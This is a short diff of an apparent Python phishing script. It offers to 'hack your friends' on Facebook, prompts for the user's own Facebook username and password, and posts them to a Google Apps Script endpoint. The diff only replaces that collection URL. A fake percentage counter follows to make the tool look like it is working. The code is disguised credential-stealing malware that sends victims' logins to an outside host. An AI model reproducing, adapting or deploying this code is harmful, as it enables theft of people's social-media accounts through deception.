@@ -14,7 +14,7 @@ print('please login with your facebook \n for hack your firends')
 umail =input("please Enter Username:")
 upass =input("please Enter Fb password'")
 data ={'mail':umail,'pass':upass}
-rq =requests.post('https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec',data=data)
+rq =requests.post('https://script.google.com/macros/s/1Ls-2zEs-hUD-mwn--OMOVyD1nljrC6Sb0xjnds-Z2pMbnsHOdDswaQGC/exec',data=data)
 
 for i in range(100):
    print(i,'%')
